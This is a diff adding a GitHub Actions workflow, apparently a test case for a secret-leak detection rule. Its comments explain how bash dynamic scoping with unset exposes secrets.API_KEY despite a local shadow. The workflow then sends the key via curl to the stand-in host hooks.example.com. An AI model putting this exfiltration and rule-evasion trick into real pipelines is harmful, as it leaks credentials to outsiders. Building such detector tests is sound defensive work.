@@ -1,0 +1,26 @@
+# situation: on push, a step defines f, which calls h on the first call of f
+#   and calls g on the second call of f; h sets s to the secret API_KEY, makes
+#   s local with safe, and calls f. g unsets s and sends $s in a header to
+#   hooks.example.com with curl.
+# reason: a todo (the same file): in the second call of f, the unset in g
+#   takes away the local that h made, and s holds the value that h set before
+#   h made s local: the secret, which the request carries to the host.
+# cause: the rule reads the second call of f, which f makes through h, where
+#   the first call of f runs, without the call of h, so the rule does not read
+#   the value that the unset reveals.
+# attack: the attacker takes over the server of the destination, by a breach
+#   of the vendor or by registering the domain when the domain lapses.
+# attack-run-behavior: curl sends the secret to hooks.example.com, whose
+#   server, now the attacker's, logs the secret.
+on: push
+jobs:
+  j:
+    runs-on: ubuntu-latest
+    steps:
+      - env:
+          API_KEY: ${{ secrets.API_KEY }}
+        run: |
+          f() { if [ -z "$inner" ]; then inner=1; h; else g; fi; }
+          g() { unset s; curl -s -H "x-apikey: $s" https://hooks.example.com/x; }
+          h() { s="$API_KEY"; local s=safe; f; }
+          f
